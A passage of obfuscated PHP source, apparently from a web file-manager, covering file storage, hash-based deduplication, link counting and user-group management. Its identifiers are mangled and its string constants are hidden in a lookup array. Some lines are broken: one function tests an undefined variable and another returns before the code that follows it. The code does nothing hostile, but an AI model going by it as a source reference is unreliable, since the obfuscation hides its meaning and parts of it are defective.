$Ñóñı¼Ì = false, $¥Œ¶òÚ = false) { $Ë…ø²Ü =& $_SERVER[¼’ç§¼´]; $õÆê²ÖŠ = Model($Ë…ø²Ü[858])->get($Ë…ø²Ü[2038]); $—êöïŠ = KodIO::defaultIO() . date($Ë…ø²Ü[2039]); $ºóéÓÆõ = $—êöïŠ . rand_string(5) . short_id(100); $—¸¯Œ°¢ = str_replace($Ë…ø²Ü[8], $Ë…ø²Ü[11], KodIO::clear($—¸¯Œ°¢)); $á«†ÚÚŠ = $Îª—¡¤->ext($—¸¯Œ°¢); if (!$—¸¯Œ°¢) { $õÆê²ÖŠ = $Ë…ø²Ü[864]; } switch ($õÆê²ÖŠ) { case $Ë…ø²Ü[2040]: if ($á«†ÚÚŠ) { $ºóéÓÆõ = $ºóéÓÆõ . $Ë…ø²Ü[10] . $á«†ÚÚŠ; } if ($á«†ÚÚŠ == $Ë…ø²Ü[1976]) { $ºóéÓÆõ .= $Ë…ø²Ü[1300]; } break; case $Ë…ø²Ü[2041]: $àÅƒ£çà = Model($Ë…ø²Ü[858])->get($Ë…ø²Ü[859]); $§Æ’±† = substr(md5($Ë…ø²Ü[860] . $àÅƒ£çà . date($Ë…ø²Ü[837])), 0, 8); $èŞÂß¼ç = KodIO::defaultDriver(); $—êöïŠ = $Ë…ø²Ü[1331] . $èŞÂß¼ç[$Ë…ø²Ü[486]] . $Ë…ø²Ü[495] . date($Ë…ø²Ü[2042]) . $§Æ’±† . $Ë…ø²Ü[8]; if ($á«†ÚÚŠ == $Ë…ø²Ü[1976]) { $—¸¯Œ°¢ .= $Ë…ø²Ü[1300]; } $©ô…ÄÎ = $Ë…ø²Ü[2043] . $—êöïŠ . $—¸¯Œ°¢; CacheLock::lock($©ô…ÄÎ); $ºóéÓÆõ = $—êöïŠ . $—¸¯Œ°¢; if (IO::exist($—êöïŠ . $—¸¯Œ°¢)) { $Òğí¸Ú¿ = substr($—¸¯Œ°¢, 0, strlen($—¸¯Œ°¢) - strlen($á«†ÚÚŠ)); $ÛØ•ˆã» = $¥Œ¶òÚ ? substr($¥Œ¶òÚ, 0, 5) : ($Ñóñı¼Ì ? substr($Ñóñı¼Ì, 0, 5) : rand_string(5)); $ºóéÓÆõ = $—êöïŠ . $Òğí¸Ú¿ . $ÛØ•ˆã»; if ($á«†ÚÚŠ) { $ºóéÓÆõ = $ºóéÓÆõ . $Ë…ø²Ü[10] . $á«†ÚÚŠ; } } if (IO::isOsDriver($ºóéÓÆõ) && !IO::isUploadServer($ºóéÓÆõ)) { if (IO::exist($ºóéÓÆõ)) { CacheLock::unlock($©ô…ÄÎ); return $ºóéÓÆõ; } $¿¼Î‹áÈ = IO::setContent($ºóéÓÆõ, $Ë…ø²Ü[12]); if (!$¿¼Î‹áÈ) { show_json($Ë…ø²Ü[2044], !1); } } CacheLock::unlock($©ô…ÄÎ); break; case $Ë…ø²Ü[864]: break; default: break; } return $ºóéÓÆõ; } public function addFileByRemote($¡ÇÌÇÎë, $’û¬±¾‰, $şÀ– „ä = array()) { $Û³î›¥¼ =& $_SERVER[¼’ç§¼´]; if (!IO::exist($¡ÇÌÇÎë)) { return !1; } $ûååç”¹ = $şÀ– „ä[$Û³î›¥¼[558]] ? $şÀ– „ä[$Û³î›¥¼[558]] : $Û³î›¥¼[12]; $åÇ÷şøŞ = IO::hashMd5($¡ÇÌÇÎë, $ûååç”¹); $‘ıÔ‚üì = KodIO::defaultDriver(); $Ê«‹ß„Ü = array($Û³î›¥¼[631] => IO::size($¡ÇÌÇÎë), $Û³î›¥¼[2045] => 1, $Û³î›¥¼[505] => $’û¬±¾‰, $Û³î›¥¼[897] => $‘ıÔ‚üì[$Û³î›¥¼[486]], $Û³î›¥¼[506] => $¡ÇÌÇÎë, $Û³î›¥¼[2046] => $şÀ– „ä[$Û³î›¥¼[686]] ? $şÀ– „ä[$Û³î›¥¼[686]] : IO::hashSimple($¡ÇÌÇÎë), $Û³î›¥¼[2047] => $åÇ÷şøŞ ? $åÇ÷şøŞ : $ûååç”¹); if ($÷üà‰—³ = $this->addFileCheckExist($Ê«‹ß„Ü[$Û³î›¥¼[686]], $Ê«‹ß„Ü[$Û³î›¥¼[558]], $Ê«‹ß„Ü[$Û³î›¥¼[79]])) { return $÷üà‰—³; } return $this->addFileData($Ê«‹ß„Ü); } private function addFileData($£¤ÍÈ¯‘) { $¦¡†“¨Ä =& $_SERVER[¼’ç§¼´]; if (!$£¤ÍÈ¯‘) { return !1; } $£¤ÍÈ¯‘[$¦¡†“¨Ä[79]] = intval($£¤ÍÈ¯‘[$¦¡†“¨Ä[79]]); if (!$£¤ÍÈ¯‘[$¦¡†“¨Ä[79]] && strlen($£¤ÍÈ¯‘[$¦¡†“¨Ä[686]]) > 32) { $£¤ÍÈ¯‘[$¦¡†“¨Ä[79]] = intval(substr($£¤ÍÈ¯‘[$¦¡†“¨Ä[686]], 32)); } $àğİ¢  = $this->add($£¤ÍÈ¯‘); return $this->find($àğİ¢ ); } public function addFile($üñÌ¬Œù, $üšÆ°íÖ, $ÓÛ±ä˜· = false) { $ÛØÓ¹Ô =& $_SERVER[¼’ç§¼´]; $ãĞÖ§ü  = IO::hashSimple($üñÌ¬Œù); $Ÿˆ‰íëı = IO::size($üñÌ¬Œù); $â„’ÓÖî = $Ÿˆ‰íëı <= 1024 * 1024 * 10 ? IO::hashMd5($üñÌ¬Œù) : $ÛØÓ¹Ô[12]; $èâ¸äéâ = $ÛØÓ¹Ô[2048] . $ãĞÖ§ü ; CacheLock::lock($èâ¸äéâ); if ($â„’ÓÖî && $ãĞÖ§ü ) { $µêÕ°‘ = $this->addFileCheckExist($ãĞÖ§ü , $â„’ÓÖî, $Ÿˆ‰íëı); if ($µêÕ°‘) { CacheLock::unlock($èâ¸äéâ); return $µêÕ°‘; } } $¼£¤‹¹ = $this->addFileMake($üñÌ¬Œù, $Ÿˆ‰íëı, $ãĞÖ§ü , $â„’ÓÖî, $üšÆ°íÖ, $ÓÛ±ä˜·); $›Ãñƒ€‰ = $this->addFileData($¼£¤‹¹); CacheLock::unlock($èâ¸äéâ); if (!$â„’ÓÖî && $›Ãñƒ€‰) { $this->fileMd5Check($›Ãñƒ€‰); } return $›Ãñƒ€‰; } public function fileMd5Check($­Á›Òæ€) { $’™ô±ğ÷ =& $_SERVER[¼’ç§¼´]; $Ú¬¬©µ = array($­Á›Òæ€[$’™ô±ğ÷[552]], $­Á›Òæ€[$’™ô±ğ÷[87]]); $¶–î„Û§ = $’™ô±ğ÷[2049] . $­Á›Òæ€[$’™ô±ğ÷[87]]; $ñèÑŠİÌ = $’™ô±ğ÷[2050] . $­Á›Òæ€[$’™ô±ğ÷[552]]; TaskQueue::add($’™ô±ğ÷[2051], $Ú¬¬©µ, $¶–î„Û§, $ñèÑŠİÌ); } public function fileMd5Set($°ìêÒÎµ, $•°ø¤”Ô) { $Æó¾õë÷ =& $_SERVER[¼’ç§¼´]; $æ‡æ´À = $this->find($°ìêÒÎµ); if (!$æ‡æ´À || $æ‡æ´À[$Æó¾õë÷[558]]) { return; } $„ù—›Ê = IO::hashMd5($•°ø¤”Ô); if (!$„ù—›Ê) { return $Æó¾õë÷[12]; } $this->where(array($Æó¾õë÷[552] => $°ìêÒÎµ))->save(array($Æó¾õë÷[558] => $„ù—›Ê)); } public function addFileMake($ô×…„§, $›»Â„¿, $ßÙ«•Ø, $æ‚¸Æö—, $”Şß¹üÖ, $ñ¶îÎôÃ) { $·øö²šø =& $_SERVER[¼’ç§¼´]; $í›»Ñòï = $this->createFileName($”Şß¹üÖ, $ßÙ«•Ø, $æ‚¸Æö—); $â”±»ÊÖ = get_path_father($í›»Ñòï); $å¦íÅ¶‚ = get_path_this($í›»Ñòï); if ($ñ¶îÎôÃ) { $¡Æìøê† = IO::move($ô×…„§, $â”±»ÊÖ, !1, $å¦íÅ¶‚); } else { $¡Æìøê† = IO::copy($ô×…„§, $â”±»ÊÖ, !1, $å¦íÅ¶‚); } if (!$¡Æìøê†) { return !1; } $ú¶„¢ÍĞ = KodIO::defaultDriver(); $çƒ¬›Å = array($·øö²šø[631] => $›»Â„¿, $·øö²šø[2045] => 1, $·øö²šø[505] => $”Şß¹üÖ, $·øö²šø[897] => $ú¶„¢ÍĞ[$·øö²šø[486]], $·øö²šø[506] => $í›»Ñòï, $·øö²šø[2046] => $ßÙ«•Ø, $·øö²šø[2047] => $æ‚¸Æö—); return $çƒ¬›Å; } public function addFileCheckExist($ƒş—¬Ì, $•ÕÏÈ•, $§‚ğúİ) { $×©®ü‘¢ =& $_SERVER[¼’ç§¼´]; $ÙÈ¾´é² = $this->findByHash($ƒş—¬Ì, $•ÕÏÈ•); if (!$ÙÈ¾´é²) { return !1; } $ŸÆÍÄÔ = array($×©®ü‘¢[2045] => intval($ÙÈ¾´é²[$×©®ü‘¢[2052]]) + 1, $×©®ü‘¢[631] => $§‚ğúİ); $this->where(array($×©®ü‘¢[553] => $ÙÈ¾´é²[$×©®ü‘¢[552]]))->save($ŸÆÍÄÔ); return $ÙÈ¾´é²; } public function remove($–îº‰õÒ) { $this->linkCountChange($–îº‰õÒ, !1); $this->clearEmpty(); return !0; } public function linkAdd($ğÌÚ¶Æœ) { $this->linkCountChange($ğÌÚ¶Æœ, !0); } public function linkCountChange($†ôÕÓ, $ÙÅ†è†ö) { $¯Ìæ‚× =& $_SERVER[¼’ç§¼´]; if (!$†ôÕÓ) { return; } if (!is_array($†ôÕÓ)) { $†ôÕÓ = array($†ôÕÓ); } $Ÿ³¶Ş•´ = array(); foreach ($†ôÕÓ as $ÂÆÕ•¥Â) { $¢ÚíÜÏ› = $ÂÆÕ•¥Â . $¯Ìæ‚×[12]; if (!$Ÿ³¶Ş•´[$¢ÚíÜÏ›]) { $Ÿ³¶Ş•´[$¢ÚíÜÏ›] = 0; } $Ÿ³¶Ş•´[$¢ÚíÜÏ›]++; } $”ûšãƒ¤ = array(); foreach ($Ÿ³¶Ş•´ as $ÂÆÕ•¥Â => $õº–ø Ê) { $¢ÚíÜÏ› = $õº–ø Ê . $¯Ìæ‚×[12]; if (!$”ûšãƒ¤[$¢ÚíÜÏ›]) { $”ûšãƒ¤[$¢ÚíÜÏ›] = array(); } $”ûšãƒ¤[$¢ÚíÜÏ›][] = $ÂÆÕ•¥Â; } foreach ($”ûšãƒ¤ as $õº–ø Ê => $“‚ù„×™) { if (!$“‚ù„×™) { continue; } $õº–ø Ê = $ÙÅ†è†ö ? $õº–ø Ê : -intval($õº–ø Ê); $éßÅ‚ò¸ = array($¯Ìæ‚×[552] => array($¯Ìæ‚×[7], $“‚ù„×™)); if ($õº–ø Ê < 0) { $éßÅ‚ò¸[$¯Ìæ‚×[2052]] = array($¯Ìæ‚×[1101], abs($õº–ø Ê)); } $this->where($éßÅ‚ò¸)->setAdd($¯Ìæ‚×[2052], $õº–ø Ê); } } public function findByHash($ƒ¥Ï¥¢˜, $Ñğ»î®‰ = false) { $±§šØÑ™ =& $_SERVER[¼’ç§¼´]; if (!$ƒ¥Ï¥¢˜ && !$Ñğ»î®‰) { return !1; } $€àÀ„•£ = array($±§šØÑ™[2046] => $ƒ¥Ï¥¢˜); if ($Ñğ»î®‰) { $€àÀ„•£ = array($±§šØÑ™[2047] => $Ñğ»î®‰); } return $this->order($±§šØÑ™[2053])->where($€àÀ„•£)->find(); } public function clearEmpty($Ç¡ŒŠá = 1) { $Ùıóàä‘ =& $_SERVER[¼’ç§¼´]; $Œ€“Îç = time() - 3600 * 24 * $Ç¡ŒŠá; $¨œ»à£ğ = $Ùıóàä‘[2054] . $Œ€“Îç; $Û‰ÛÂÆÖ = $this->where($¨œ»à£ğ)->select(); if (!$Û‰ÛÂÆÖ) { return; } $ÖÜû¹’Ş = new Task($Ùıóàä‘[2055], $Ùıóàä‘[12], count($Û‰ÛÂÆÖ)); foreach ($Û‰ÛÂÆÖ as $÷ÊÑÀæ) { $ÖÜû¹’Ş->update(1); $this->resetFile($÷ÊÑÀæ); } $ÖÜû¹’Ş->end(); } public function resetFile($„øáØˆĞ) { $ò˜ÛÛêÓ =& $_SERVER[¼’ç§¼´]; $¿©‰÷ª = array($ò˜ÛÛêÓ[553] => $„øáØˆĞ[$ò˜ÛÛêÓ[552]]); $êƒ¹«ä = Model($ò˜ÛÛêÓ[1430])->where($¿©‰÷ª)->count(); $ëóß¯‘± = Model($ò˜ÛÛêÓ[2056])->where($¿©‰÷ª)->count(); $ÚÚè¡û½ = intval($êƒ¹«ä) + intval($ëóß¯‘±); if ($ÚÚè¡û½ == 0) { IO::remove($„øáØˆĞ[$ò˜ÛÛêÓ[87]]); Model($ò˜ÛÛêÓ[2057])->delete($„øáØˆĞ[$ò˜ÛÛêÓ[552]]); $this->where($¿©‰÷ª)->delete(); $this->metaSet($„øáØˆĞ[$ò˜ÛÛêÓ[552]], null, null); write_log(ACTION . $ò˜ÛÛêÓ[2058] . KodUser::id() . $ò˜ÛÛêÓ[2059] . $„øáØˆĞ[$ò˜ÛÛêÓ[552]] . $ò˜ÛÛêÓ[2060] . $„øáØˆĞ[$ò˜ÛÛêÓ[79]] . $ò˜ÛÛêÓ[201] . $„øáØˆĞ[$ò˜ÛÛêÓ[87]], $ò˜ÛÛêÓ[2061]); return; } if ($„øáØˆĞ[$ò˜ÛÛêÓ[2052]] != $ÚÚè¡û½) { $this->where($¿©‰÷ª)->save(array($ò˜ÛÛêÓ[2045] => $ÚÚè¡û½)); } } public function storageInfo($µÚöù‡¶ = false) { $ì¶Üîœ¾ =& $_SERVER[¼’ç§¼´]; $¬ıÆ™ËÄ = $this->count() + 0.0; $’ÓÎÛª = 0; $¶Şà¢¶® = 1; $¨íÎâğÂ = 0; $üë«ºÖ· = 5000; for ($€å¨´± = 0; $€å¨´± < $¬ıÆ™ËÄ; $€å¨´± = $€å¨´± + $üë«ºÖ·) { $ç«¨ÎŒÍ = $this->limit($€å¨´±, $€å¨´± + $üë«ºÖ·)->select(); foreach ($ç«¨ÎŒÍ as $›şÔ¬¡×) { $¶Şà¢¶® += $›şÔ¬¡×[$ì¶Üîœ¾[79]] * $›şÔ¬¡×[$ì¶Üîœ¾[2052]]; $’ÓÎÛª += $›şÔ¬¡×[$ì¶Üîœ¾[79]] * ($›şÔ¬¡×[$ì¶Üîœ¾[2052]] - 1); $¨íÎâğÂ += $›şÔ¬¡×[$ì¶Üîœ¾[2052]]; } } $°®ÒÈ‹Ô = array($ì¶Üîœ¾[2062] => $¶Şà¢¶®, $ì¶Üîœ¾[2063] => $’ÓÎÛª, $ì¶Üîœ¾[2064] => $’ÓÎÛª / $¶Şà¢¶®, $ì¶Üîœ¾[83] => $¬ıÆ™ËÄ, $ì¶Üîœ¾[2065] => $¨íÎâğÂ); return $°®ÒÈ‹Ô; } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\165\x70"; protected $tableMeta = array("\x74\141\142\x6c\x65\116\x61\x6d\145" => "\x67\162\157\165\160\137\155\x65\x74\x61", "\155\145\164\141\x46\151\145\x6c\x64" => "\x67\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($ôÖ²‡‘Ÿ) { $³É®Ÿî¸ =& $_SERVER[¼’ç§¼´]; return array($³É®Ÿî¸[2066] => array($ôÖ²‡‘Ÿ[0], $³É®Ÿî¸[2067]), $³É®Ÿî¸[2068] => array($ôÖ²‡‘Ÿ[0], $³É®Ÿî¸[2069])); } protected function getInfo($Ÿ¶Á«â«, $¥À­’à = false) { $ıšÕ§Øß = $this->getInfoSimple($Ÿ¶Á«â«); if (!$ıšÕ§Øß) { return !1; } if ($¥À­’à) { return $this->_listDataApplyItem($ıšÕ§Øß); } return $this->cacheFunctionGet($_SERVER[¼’ç§¼´][2070], $Ÿ¶Á«â«); } protected function getInfoSimple($ÑÃòùğñ, $µÑ÷ä¦Â = false) { $Õß©Ö‰æ =& $_SERVER[¼’ç§¼´]; if ($µÑ÷ä¦Â) { $‹µş”ûş = array($Õß©Ö‰æ[1984] => intval($ÑÃòùğñ)); $£ï«ÀØ = $this->where($‹µş”ûş)->find(); return is_array($£ï«ÀØ) ? $£ï«ÀØ : array(); } return $this->cacheFunctionGet($Õß©Ö‰æ[2071], $ÑÃòùğñ); } protected function groupAdd($æŞ©Ï÷ä) { $îÅšµã =& $_SERVER[¼’ç§¼´]; if (!$æŞ©Ï÷ä[$îÅšµã[192]] && isset($æŞ©Ï÷ä[$îÅšµã[1984]]) && $æŞ©Ï÷ä[$îÅšµã[1984]] == 1) { if ($Æ¥ˆüˆƒ = $this->getInfoSimple($æŞ©Ï÷ä[$îÅšµã[1984]], !0)) { return $æŞ©Ï÷ä[$îÅšµã[1984]]; } } else { $Æ¥ˆüˆƒ = $this->getInfoSimple($æŞ©Ï÷ä[$îÅšµã[192]]); if (!$Æ¥ˆüˆƒ) { return !1; } } $•Ÿé¦Ó = $îÅšµã[604]; if ($Æ¥ˆüˆƒ[$îÅšµã[595]]) { $•Ÿé¦Ó = $Æ¥ˆüˆƒ[$îÅšµã[595]] . $Æ¥ˆüˆƒ[$îÅšµã[1984]] . $îÅšµã[50]; } $á…Ç ¾ = array($îÅšµã[505] => $this->groupNameAuto($æŞ©Ï÷ä[$îÅšµã[192]], $æŞ©Ï÷ä[$îÅšµã[32]]), $îÅšµã[488] => $æŞ©Ï÷ä[$îÅšµã[192]], $îÅšµã[666] => $•Ÿé¦Ó, $îÅšµã[2072] => $æŞ©Ï÷ä[$îÅšµã[1970]], $îÅšµã[2073] => 0, $îÅšµã[1988] => 0); if (isset($æŞ©Ï÷ä[$îÅšµã[2008]])) { $á…Ç ¾[$îÅšµã[2008]] = $æŞ©Ï÷ä[$îÅšµã[2008]]; } else { $»…ü¯»ñ = $this->max($îÅšµã[2008]); if (!$»…ü¯»ñ) { $»…ü¯»ñ = 0; } $á…Ç ¾[$îÅšµã[2008]] = $»…ü¯»ñ + 1; } if (!empty($æŞ©Ï÷ä[$îÅšµã[1984]])) { $á…Ç ¾[$îÅšµã[1984]] = $æŞ©Ï÷ä[$îÅšµã[1984]]; } $ß¦ÜÆ’¹ = $this->add($á…Ç ¾); $this->setNamePinyin($ß¦ÜÆ’¹, $á…Ç ¾[$îÅšµã[32]]); if (isset($æŞ©Ï÷ä[$îÅšµã[2074]])) { $this->metaSet($ß¦ÜÆ’¹, array($îÅšµã[2074] => $æŞ©Ï÷ä[$îÅšµã[2074]], $îÅšµã[2075] => $æŞ©Ï÷ä[$îÅšµã[2075]])); unset($æŞ©Ï÷ä[$îÅšµã[2074]]); unset($æŞ©Ï÷ä[$îÅšµã[2075]]); } Model($îÅšµã[1430])->groupRootAdd($ß¦ÜÆ’¹); $this->_clearCache($æŞ©Ï÷ä[$îÅšµã[192]]); return $ß¦ÜÆ’¹; } protected function groupEdit($½íÌ™é›, $£ÈË–§Û) { $ÜÊË‡ôà =& $_SERVER[¼’ç§¼´]; $æ™ˆğ = $this->getInfoSimple($½íÌ™é›); if (!$æ™ˆğ) { return !1; } if (!empty($£ÈË–§Û[$ÜÊË‡ôà[192]])) { $¸†úÚ‹‘ = $this->getInfoSimple($£ÈË–§Û[$ÜÊË‡ôà[192]]); if (!$¸†úÚ‹‘) { return !1; } if ($æ™ˆğ[$ÜÊË‡ôà[1984]] == $¸†úÚ‹‘[$ÜÊË‡ôà[1984]]) { return !1; } if ($£ÈË–§Û[$ÜÊË‡ôà[192]] != $æ™ˆğ[$ÜÊË‡ôà[192]]) { if ($¸†úÚ‹‘[$ÜÊË‡ôà[595]] !== $æ™ˆğ[$ÜÊË‡ôà[595]] && strpos($¸†úÚ‹‘[$ÜÊË‡ôà[595]], $æ™ˆğ[$ÜÊË‡ôà[595]] . $æ™ˆğ[$ÜÊË‡ôà[1984]] . $ÜÊË‡ôà[50]) === 0) { return !1; } $£ÈË–§Û[$ÜÊË‡ôà[666]] = $¸†úÚ‹‘[$ÜÊË‡ôà[595]] . $£ÈË–§Û[$ÜÊË‡ôà[192]] . $ÜÊË‡ôà[50]; $this->_changeChildLevel($æ™ˆğ, $¸†úÚ‹‘); $this->_clearCache($¸†úÚ‹‘[$ÜÊË‡ôà[1984]]); $this->_clearCache($æ™ˆğ[$ÜÊË‡ôà[192]]); } } if (isset($£ÈË–§Û[$ÜÊË‡ôà[32]])) { $this->setNamePinyin($½íÌ™é›, $£ÈË–§Û[$ÜÊË‡ôà[32]]); } if (isset($£ÈË–§Û[$ÜÊË‡ôà[2074]])) { $this->metaSet($½íÌ™é›, array($ÜÊË‡ôà[2074] => $£ÈË–§Û[$ÜÊË‡ôà[2074]], $ÜÊË‡ôà[2075] => $£ÈË–§Û[$ÜÊË‡ôà[2075]])); unset($£ÈË–§Û[$ÜÊË‡ôà[2074]]); unset($£ÈË–§Û[$ÜÊË‡ôà[2075]]); } $this->_clearChildrenCache($æ™ˆğ); return $this->where(array($ÜÊË‡ôà[2076] => $½íÌ™é›))->save($£ÈË–§Û); } private function _clearChildrenCache($Ò—âñó·) { $ªé™üô’ =& $_SERVER[¼’ç§¼´]; $µÚôî±® = array($ªé™üô’[666] => array($ªé™üô’[626], $Ò—âñó·[$ªé™üô’[595]] . $Ò—âñó·[$ªé™üô’[1984]] . $ªé™üô’[627])); $û®’İÔê = $this->field($ªé™üô’[1984])->where($µÚôî±®)->select(); foreach ($û®’İÔê as $£Ùçºßë) { $this->_clearCache($£Ùçºßë[$ªé™üô’[1984]]); } } private function _clearCache($Ïé •äÔ) { $´¾çöÀĞ =& $_SERVER[¼’ç§¼´]; $this->cacheFunctionClear($´¾çöÀĞ[2070], $Ïé •äÔ); $this->cacheFunctionClear($´¾çöÀĞ[2071], $Ïé •äÔ); } private function _changeChildLevel($àÀŞÏÑ÷, $î¾½Æº¡, $ã±Ğ„¿ = false) { $¯²¢À¶È =& $_SERVER[¼’ç§¼´]; $ªãá¦ÄÄ = $àÀŞÏÑ÷[$¯²¢À¶È[595]] . $àÀŞÏÑ÷[$¯²¢À¶È[1984]] . $¯²¢À¶È[50]; $É›Şâû = $î¾½Æº¡[$¯²¢À¶È[595]] . $î¾½Æº¡[$¯²¢À¶È[1984]] . $¯²¢À¶È[50] . $àÀŞÏÑ÷[$¯²¢À¶È[1984]] . $¯²¢À¶È[50]; if ($ã±Ğ„¿) { $É›Şâû = $î¾½Æº¡[$¯²¢À¶È[595]] . $î¾½Æº¡[$¯²¢À¶È[1984]] . $¯²¢À¶È[50]; } $»ìªÃŒ™ = array($¯²¢À¶È[666] => array($¯²¢À¶È[626], $àÀŞÏÑ÷[$¯²¢À¶È[595]] . $àÀŞÏÑ÷[$¯²¢À¶È[1984]] . $¯²¢À¶È[627])); $ğææ­Û© = array($¯²¢À¶È[666] => array($¯²¢À¶È[675], "\x72\145\160\x6c\x61\143\x65\x28\160\141\162\x65\156\164\114\145\166\145\154\x2c\x27{$ªãá¦ÄÄ}\x27\54\47{$É›Şâû}\x27\51")); $this->_clearChildrenCache($àÀŞÏÑ÷); $this->where($»ìªÃŒ™)->data($ğææ­Û©)->save(); } public function setNamePinyin($ÆàáÂÏé, $‰Çí°ğÃ = false) { $¢ƒÜ­ˆ =& $_SERVER[¼’ç§¼´]; if (!$‰Çí°ğÃ) { $ÃÃ¹õËæ = $this->getInfoSimple($ÆàáÂÏé); $‰Çí°ğÃ = $ÃÃ¹õËæ[$¢ƒÜ­ˆ[32]]; } if (!Input::check($‰Çí°ğÃ, $¢ƒÜ­ˆ[669])) { $this->metaSet($ÆàáÂÏé, $¢ƒÜ­ˆ[549], null); $this->metaSet($ÆàáÂÏé, $¢ƒÜ­ˆ[548], null); return; } $²ë‹ÌîÕ = array($¢ƒÜ­ˆ[549] => str_replace($¢ƒÜ­ˆ[53], $¢ƒÜ­ˆ[12], Pinyin::get($‰Çí°ğÃ)), $¢ƒÜ­ˆ[548] => Pinyin::get($‰Çí°ğÃ, $¢ƒÜ­ˆ[670])); $this->metaSet($ÆàáÂÏé, $²ë‹ÌîÕ); } protected function metaSet($‹ÙÈé, $ë…×Öø = null, $„øï¿Õâ = null) { $this->_clearCache($‹ÙÈé); return parent::metaSet($‹ÙÈé, $ë…×Öø, $„øï¿Õâ); } protected function groupStatus($ŠõÒøôÜ, $É‰¥ü§Æ) { $ãÚ¾°İ£ =& $_SERVER[¼’ç§¼´]; $ìüÙ¶ˆÁ = $this->getInfoSimple($ŠõÒøôÜ); if (!$ìüÙ¶ˆÁ) { return !1; } $this->_clearCache($ŠõÒøôÜ); return $this->metaSet($ŠõÒøôÜ, $ãÚ¾°İ£[838], $É‰¥ü§Æ); if ($É‰¥ü§Æ == $ãÚ¾°İ£[91]) { $ƒÕ¯¶æ“ = $this->parentLevelArray($ìüÙ¶ˆÁ[$ãÚ¾°İ£[595]]); } else { } $ƒÕ¯¶æ“[] = $ìüÙ¶ˆÁ[$ãÚ¾°İ£[1984]]; $£òº“óÃ = array(); foreach ($ƒÕ¯¶æ“ as $ŠõÒøôÜ) { $£òº“óÃ[] = array($ãÚ¾°İ£[1984] => $ŠõÒøôÜ, $ãÚ¾°İ£[97] => $ãÚ¾°İ£[838], $ãÚ¾°İ£[461] => $É‰¥ü§Æ); $this->_clearCache($ŠõÒøôÜ); } return Model($ãÚ¾°İ£[2077])->addAll($£òº“óÃ, array(), !0); } protected function groupRemove($‘Ò”½ş, $ñ›ûæ“À = false) { $Ğ¥ğ¸İÀ =& $_SERVER[¼’ç§¼´]; $…ë¶ıÏö = array($Ğ¥ğ¸İÀ[1984] => $‘Ò”½ş); $ˆíò±ÜË = $this->where($…ë¶ıÏö)->find(); if (!$ˆíò±ÜË || $ˆíò±ÜË[$Ğ¥ğ¸İÀ[192]] == 0) { return !1; } if (!$ñ›ûæ“À) { $€û¼­×™ = $this->getInfoSimple($ˆíò±ÜË[$Ğ¥ğ¸İÀ[192]]); $this->_changeChildLevel($ˆíò±ÜË, $€û¼­×™, !0); $this->where(array($Ğ¥ğ¸İÀ[192] => $‘Ò”½ş))->save(array($Ğ¥ğ¸İÀ[192] => $ˆíò±ÜË[$Ğ¥ğ¸İÀ[192]])); $this->_clearCache($€û¼­×™[$Ğ¥ğ¸İÀ[1984]]); } Model($Ğ¥ğ¸İÀ[2077])->where($…ë¶ıÏö)->delete(); Model($Ğ¥ğ¸İÀ[2078])->where($…ë¶ıÏö)->delete(); Model($Ğ¥ğ¸İÀ[913])->groupRootRemove($‘Ò”½ş); $this->_clearCache($ˆíò±ÜË[$Ğ¥ğ¸İÀ[192]]); return $this->where($…ë¶ıÏö)->delete(); } protected function groupSort($í‚‡ššà) { $™Ä‰äØ =& $_SERVER[¼’ç§¼´]; $ëûÊÆÏª = array(); foreach ($í‚‡ššà as $„­½› => $”˜¸ğ—Û) { $ëûÊÆÏª[] = array($™Ä‰äØ[1984], $”˜¸ğ—Û, $™Ä‰äØ[2008], $„­½› + 1); } $this->saveAll($ëûÊÆÏª); } public function listData() { $ÓìüµÔ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÓìüµÔ[$_SERVER[¼’ç§¼´][456]]); return $ÓìüµÔ; } private function _makeOrder($ıÃ¢Ù¦Œ = '') { $‘ñå¶äœ =& $_SERVER[¼’ç§¼´]; $ÔÃ„çæ = array($‘ñå¶äœ[1984], $‘ñå¶äœ[32], $‘ñå¶äœ[1972], $‘ñå¶äœ[233]); $èÑÊúÑé = array($‘ñå¶äœ[534] => $‘ñå¶äœ[535], $‘ñå¶äœ[536] => $‘ñå¶äœ[537]); $ª´Œë±ò = Input::get($‘ñå¶äœ[541], $‘ñå¶äœ[7], $‘ñå¶äœ[1988], $ÔÃ„çæ); $™Øşæü¿ = Input::get($‘ñå¶äœ[542], $‘ñå¶äœ[7], $‘ñå¶äœ[2079], array($‘ñå¶äœ[2079], $‘ñå¶äœ[536])); $™Øşæü¿ = $èÑÊúÑé[$™Øşæü¿]; $ıÃ¢Ù¦Œ = $ıÃ¢Ù¦Œ . "{$ª´Œë±ò}\x20{$™Øşæü¿}\54\40\x67\x72\x6f\165\x70\x49\x44\40\x61\x73\x63"; return $this->order($ıÃ¢Ù¦Œ); } public function listChild($º­Ïõá) { $ÉéïÈ®¾ =& $_SERVER[¼’ç§¼´]; $ï°Ş„¨‘ = $this->where(array($ÉéïÈ®¾[192] => $º­Ïõá))->_makeOrder()->selectPage(200); $this->_listDataApply($ï°Ş„¨‘[$ÉéïÈ®¾[456]]); return $ï°Ş„¨‘; } public function listChildIds($Â—ÉÄäë) { $Íúëé ¸ =& $_SERVER[¼’ç§¼´]; if (is_string($ù–ÒÛŞ)) { $Â—ÉÄäë = explode($Íúëé ¸[50], $Â—ÉÄäë); } $ò”Š…¶• = $this->where(array($Íúëé ¸[1984] => array($Íúëé ¸[7], $Â—ÉÄäë)))->field($Íúëé ¸[2080])->select(); if (!$ò”Š…¶•) { return !1; } $›í¨áÀà = array(); foreach ($ò”Š…¶• as $Ø™Ó¬ò») { $›í¨áÀà[] = "\x73\x65\154\145\x63\164\x20\147\x72\x6f\165\x70\111\104\40\x66\x72\x6f\155\40\140\x67\162\157\x75\x70\140\40\x77\x68\x65\162\x65\40\x70\x61\x72\145\156\x74\x4c\145\x76\x65\x6c\x20\x6c\151\153\x65\40\47{$Ø™Ó¬ò»[$Íúëé ¸[595]]}{$Ø™Ó¬ò»[$Íúëé ¸[1984]]}\54\45\47"; } $›í¨áÀà = implode($Íúëé ¸[2081], $›í¨áÀà); $ò”Š…¶• = $this->query($›í¨áÀà); if (!$ò”Š…¶•) { return array(); } $Â—ÉÄäë = array_to_keyvalue($ò”Š…¶•, $Íúëé ¸[12], $Íúëé ¸[1984]); return array_unique($Â—ÉÄäë); } public function listByID($Ş­¿¢Šç) { $”´ÊØŒ =& $_SERVER[¼’ç§¼´]; if (!$Ş­¿¢Šç) { return array(); } $ÅşªÆ = 